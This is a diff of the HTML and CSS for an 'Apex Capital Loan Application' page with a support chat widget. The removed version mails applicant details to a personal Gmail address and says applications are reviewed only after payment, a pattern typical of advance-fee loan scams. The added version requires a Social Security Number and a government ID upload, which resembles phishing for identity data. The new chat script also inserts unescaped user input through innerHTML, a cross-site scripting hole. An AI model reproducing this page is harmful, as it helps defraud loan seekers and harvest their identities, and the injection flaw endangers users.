@@ -9,41 +9,36 @@
             font-family: Arial, sans-serif;
             background-color: #f4f7f6;
             margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            padding: 20px;
         }
         .container {
-            background-color: #ffffff;
+            max-width: 600px;
+            background: #ffffff;
+            margin: 0 auto;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 400px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
         h2 {
-            margin-bottom: 20px;
             color: #333;
             text-align: center;
         }
         .notice {
-            background-color: #e8f4fd;
-            border-left: 4px solid #2196F3;
-            padding: 10px;
-            font-size: 13px;
-            color: #0d47a1;
+            background-color: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 12px;
             margin-bottom: 20px;
+            font-size: 14px;
+            color: #0d47a1;
         }
         .form-group {
             margin-bottom: 15px;
         }
         label {
             display: block;
-            margin-bottom: 5px;
             font-weight: bold;
+            margin-bottom: 5px;
             color: #555;
-            font-size: 14px;
         }
         input, select {
             width: 100%;
@@ -51,188 +46,172 @@
             border: 1px solid #ccc;
             border-radius: 4px;
             box-sizing: border-box;
-            font-size: 14px;
         }
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #007bff;
-            border: none;
+            background-color: #0056b3;
             color: white;
-            font-size: 16px;
+            padding: 12px;
+            border: none;
             border-radius: 4px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
         }
         button:hover {
-            background-color: #0056b3;
+            background-color: #004085;
         }
 
-        /* Live Chat Widget Styles */
-        #chat-widget {
+        /* Floating Support Chat Styles */
+        .chat-toggle-btn {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            width: 300px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 50%
+            width: 60px;
+            height: 60px;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
             z-index: 1000;
         }
-        #chat-header {
-            background-color: #007bff;
+        .chat-container {
+            position: fixed;
+            bottom: 90px;
+            right: 20px;
+            width: 320px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+            z-index: 1000;
+        }
+        .chat-header {
+            background-color: #0056b3;
             color: white;
-            padding: 10px;
+            padding: 12px;
             font-weight: bold;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        #chat-messages {
+        .chat-body {
+            padding: 15px;
             height: 200px;
-            padding: 10px;
             overflow-y: auto;
-            font-size: 13px;
             background: #f9f9f9;
+            font-size: 14px;
+        }
+        .chat-footer {
             display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .chat-message {
-            padding: 6px 10px;
-            border-radius: 6px;
-            max-width: 80%;
-        }
-        .chat-message.support {
-            background: #e1ecf4;
-            align-self: flex-start;
-            color: #333;
-        }
-        .chat-message.user {
-            background: #007bff;
-            color: white;
-            align-self: flex-end;
-        }
-        #chat-input-area {
-            display: flex;
+            padding: 10px;
             border-top: 1px solid #ddd;
+            background: white;
         }
-        #chat-input {
+        .chat-footer input {
             flex: 1;
             padding: 8px;
-            border: none;
-            font-size: 13px;
-            outline: none;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
-        #chat-send {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 0 15px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        #chat-send:hover {
-            background-color: #0056b3;
+        .chat-footer button {
+            width: auto;
+            padding: 8px 12px;
+            margin-left: 5px;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Apex Capital Loan Application</h2>
-        <div class="notice">
-            <strong>Important Notice:</strong> Your loan application will be reviewed within <strong>48 hours</strong> after your payment is successfully completed.
-        </div>
-        
-        <form id="loanForm" action="mailto:Stacyrobert001@gmail.com" method="POST" enctype="text/plain">
-            <div class="form-group">
-                <label for="fullName">Full Name *</label>
-                <input type="text" id="fullName" name="Full Name" placeholder="Enter your full name" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="email">Email Address *</label>
-                <input type="email" id="email" name="Email Address" placeholder="Enter your email" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="phone">Phone Number *</label>
-                <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="amount">Loan Amount Requested ($) *</label>
-                <input type="number" id="amount" name="Loan Amount Requested" placeholder="e.g. 5000" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="purpose">Purpose of Loan *</label>
-                <select id="purpose" name="Purpose of Loan" required>
-                    <option value="" disabled selected>Select a purpose</option>
-                    <option value="Business Expansion">Business Expansion</option>
-                    <option value="Personal Use">Personal Use</option>
-                    <option value="Emergency">Emergency</option>
-                    <option value="Other">Other</option>
-                </select>
-            </div>
-            
-            <button type="submit">Submit Loan Application</button>
-        </form>
+<div class="container">
+    <h2>Apex Capital Loan Application</h2>
+    <div class="notice">
+        <strong>Important Notice:</strong> Your loan application will be reviewed within <strong>48 hours</strong> after verification is complete.
     </div>
 
-    <!-- Live Chat Widget -->
-    <div id="chat-widget">
-        <div id="chat-header">
-            <span>Apex Support Chat</span>
-            <span style="font-size: 10px; background: #28a745; padding: 2px 6px; border-radius: 4px;">Live</span>
+    <form>
+        <div class="form-group">
+            <label>Full Name *</label>
+            <input type="text" placeholder="Enter your full name" required>
         </div>
-        <div id="chat-messages">
-            <div class="chat-message support">Hello! Welcome to Apex Capital. How can we help you with your loan application today?</div>
+        <div class="form-group">
+            <label>Email Address *</label>
+            <input type="email" placeholder="Enter your email" required>
         </div>
-        <div id="chat-input-area">
-            <input type="text" id="chat-input" placeholder="Type a message...">
-            <button id="chat-send">Send</button>
+        <div class="form-group">
+            <label>Phone Number *</label>
+            <input type="tel" placeholder="Enter your phone number" required>
         </div>
+        <div class="form-group">
+            <label>Social Security Number (SSN) *</label>
+            <input type="password" placeholder="XXX-XX-XXXX" maxlength="11" required>
+        </div>
+        <div class="form-group">
+            <label>Upload Government ID / Driver's License *</label>
+            <input type="file" accept=".pdf, .jpg, .jpeg, .png" required>
+        </div>
+        <div class="form-group">
+            <label>Loan Amount Requested ($) *</label>
+            <input type="number" placeholder="e.g. 5000" required>
+        </div>
+        <div class="form-group">
+            <label>Purpose of Loan *</label>
+            <select required>
+                <option value="">Select a purpose</option>
+                <option value="business">Business Expansion</option>
+                <option value="personal">Personal Use</option>
+                <option value="emergency">Emergency</option>
+                <option value="other">Other</option>
+            </select>
+        </div>
+        <button type="submit">Submit Loan Application</button>
+    </form>
+</div>
+
+<!-- Support Chat Widget -->
+<button class="chat-toggle-btn" onclick="toggleChat()">💬</button>
+
+<div class="chat-container" id="chatContainer">
+    <div class="chat-header">
+        Apex Support Chat <span style="cursor:pointer;" onclick="toggleChat()">✕</span>
     </div>
+    <div class="chat-body" id="chatBody">
+        <p><strong>Support:</strong> Hello! Welcome to Apex Capital. How can we help you with your loan application today?</p>
+    </div>
+    <div class="chat-footer">
+        <input type="text" id="chatInput" placeholder="Type a message...">
+        <button onclick="sendMessage()">Send</button>
+    </div>
+</div>
 
-    <script>
-        // Simple interactive script for the live chat widget
-        const chatInput = document.getElementById('chat-input');
-        const chatSend = document.getElementById('chat-send');
-        const chatMessages = document.getElementById('chat-messages');
+<script>
+    function toggleChat() {
+        const chat = document.getElementById('chatContainer');
+        chat.style.display = chat.style.display === 'flex' ? 'none' : 'flex';
+    }
 
-        function appendMessage(sender, text) {
-            const msgDiv = document.createElement('div');
-            msgDiv.classList.add('chat-message', sender);
-            msgDiv.textContent = text;
-            chatMessages.appendChild(msgDiv);
-            chatMessages.scrollTop = chatMessages.scrollHeight;
-        }
+    function sendMessage() {
+        const input = document.getElementById('chatInput');
+        const body = document.getElementById('chatBody');
+        if (input.value.trim() !== '') {
+            // User message
+            body.innerHTML += `<p><strong>You:</strong> ${input.value}</p>`;
+            const userMsg = input.value;
+            input.value = '';
+            body.scrollTop = body.scrollHeight;
 
-        function handleSend() {
-            const text = chatInput.value.trim();
-            if (!text) return;
-            
-            appendMessage('user', text);
-            chatInput.value = '';
-
-            // Simulate support response
+            // Simulated auto-reply / agent response hook
             setTimeout(() => {
-                appendMessage('support', 'Thank you for your message. An agent will look into your request shortly.');
+                body.innerHTML += `<p><strong>Support:</strong> Thanks for reaching out. An agent will respond to your query regarding "${userMsg}" shortly.</p>`;
+                body.scrollTop = body.scrollHeight;
             }, 1000);
         }
+    }
+</script>
 
-        chatSend.addEventListener('click', handleSend);
-        chatInput.addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') {
-                handleSend();
-            }
-        });
-    </script>
 </body>
 </html>
